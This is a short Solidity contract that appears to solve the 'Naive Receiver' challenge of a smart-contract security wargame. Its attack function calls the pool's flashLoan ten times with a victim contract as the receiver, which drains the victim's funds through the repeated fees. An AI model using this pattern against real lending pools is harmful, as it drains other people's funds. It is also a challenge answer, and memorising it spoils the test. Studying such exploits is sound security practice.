pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract AttackNaiveReceiver {
    NaiveReceiverLenderPool pool;

    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
    }

    function attack(address victim) public {
        for (int256 i = 0; i < 10; i++) {
            pool.flashLoan(victim, 1);
        }
    }
}
